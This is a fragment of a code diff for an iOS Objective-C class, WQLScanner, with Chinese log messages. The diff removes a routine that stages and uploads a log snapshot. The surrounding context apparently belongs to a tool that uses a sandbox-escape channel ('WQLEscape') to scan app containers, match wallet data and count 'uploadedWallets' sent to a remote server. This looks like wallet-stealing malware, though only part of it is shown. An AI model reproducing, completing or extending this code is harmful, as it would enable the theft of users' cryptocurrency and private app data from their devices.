@@ -38,7 +38,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
                                    to:(NSString *)dst
                                 bytes:(uint64_t *)bytesOut;
 - (void)uploadStage:(NSString *)stage blocking:(BOOL)blocking;
-- (void)uploadLogSnapshot;
 @end
 
 @implementation WQLScanner
@@ -94,22 +93,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(300 * NSEC_PER_SEC)));
 }
 
-- (void)uploadLogSnapshot {
-    NSString *logPath = WQLLogFilePath();
-    if (![[NSFileManager defaultManager] fileExistsAtPath:logPath]) return;
-
-    NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:
-                       [NSString stringWithFormat:@"wql_logstage_%@", NSUUID.UUID.UUIDString]];
-    [[NSFileManager defaultManager] createDirectoryAtPath:stage
-                              withIntermediateDirectories:YES attributes:nil error:nil];
-    NSString *dest = [stage stringByAppendingPathComponent:@"wql_log.txt"];
-    [[NSFileManager defaultManager] copyItemAtPath:logPath toPath:dest error:nil];
-
-    [self log:@"📄 上传本次日志"];
-    [self uploadStage:stage blocking:YES];
-    [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
-}
-
 #pragma mark - 主流程
 
 - (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir {
@@ -122,7 +105,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     NSString *err = nil;
     if (![[WQLEscape shared] prepareWithError:&err]) {
         [self log:@"⛔ 通道不可用：%@", err ?: @"未知原因"];
-        [self uploadLogSnapshot];
         return @[];
     }
     NSDictionary *diag = [[WQLEscape shared] diagnostics];
@@ -133,7 +115,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
           diag[@"flagsFirst"]];
     if (![diag[@"groupOK"] boolValue]) {
         [self log:@"    ⛔ 没有共享目录：签名没带 App Group，后面无法继续"];
-        [self uploadLogSnapshot];
         return @[];
     }
 
@@ -333,7 +314,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
           (unsigned long)records.count, (unsigned long)unreadable,
           (unsigned long)matchedCount, (unsigned long)uploadedWallets];
 
-    [self uploadLogSnapshot];
     return records;
 }
 
